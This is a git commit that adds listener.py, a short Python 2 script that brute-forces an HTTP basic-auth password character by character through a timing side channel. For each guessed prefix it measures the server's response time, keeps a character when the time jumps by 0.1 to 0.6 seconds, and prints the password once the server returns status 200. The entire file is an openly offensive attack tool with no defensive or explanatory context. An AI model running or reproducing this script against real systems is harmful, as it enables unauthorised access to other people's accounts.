71164eef7457f6dad9d6a0d21780f63133e59602
Universal155 <30607998+Universal155@users.noreply.github.com>
2019-07-02 15:24:03 +0300

    Create listener.py

---
+++ listener.py
@@ -0,0 +1,31 @@
+import requests
+import time
+import sys
+
+def main(url,username):
+    alph = 'qwertyuiopasdfghjklzxcvbnm1234567890'
+    password = ''
+    prev_time=0
+    while True:
+    
+        for char in alph:
+            response = requests.get(url,auth=(username,password+char))
+            request_time = response.elapsed.total_seconds()
+    
+    
+            print 'hacker:%s' % password+char, request_time
+
+            check = request_time - prev_time
+            prev_time = request_time
+            if 0.1 <= check <= 0.6:
+               password += char
+               print password
+               break
+            if response.status_code == 200:
+                print "PASSWORD IS: ", password
+                exit()
+
+if __name__ == "__main__":
+    if len(sys.argv) < 3:
+        print "Usage: ",sys.argv[0]," <url> <username>"
+    main(sys.argv[1],sys.argv[2])
